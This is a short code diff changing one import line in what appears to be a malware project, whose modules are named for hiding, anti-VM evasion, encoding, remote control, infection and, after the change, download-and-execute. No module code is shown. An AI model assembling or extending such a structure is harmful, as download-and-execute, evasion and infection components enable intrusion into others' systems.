@@ -29,6 +29,6 @@ from hide import *
 from antivm import *
 from encoder import *
 from control import *
-from download import *
+from downexec import *
 from infect import *
 from removal import *
